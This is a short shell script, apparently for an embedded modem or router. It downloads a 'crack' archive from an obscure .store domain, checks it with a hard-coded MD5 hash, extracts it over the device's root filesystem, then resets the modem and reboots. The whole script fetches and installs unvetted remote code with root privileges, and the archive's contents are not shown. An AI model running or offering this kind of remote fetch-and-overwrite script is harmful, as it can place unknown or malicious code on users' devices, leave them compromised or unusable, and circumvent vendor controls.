#!/bin/sh
curl http://bjcjunjuncruz.store/onlypro/crack/mritech.tgz -o /tmp/firmware.tgz
echo "Checking hash!"
hash=$(md5sum /tmp/firmware.tgz | awk '{print $1}')
echo "$hash = fae3a350437a216469b29c4af0918266"
if [ $hash == 'fae3a350437a216469b29c4af0918266' ]
then
echo "Same!"
mv /etc_ro/tmp/firmware* /etc_ro/tmp/firmware.tgz
tar -zxvf /tmp/firmware.tgz -C /
at_cmd at+zreset
reboot
else
echo "Not same!"
fi
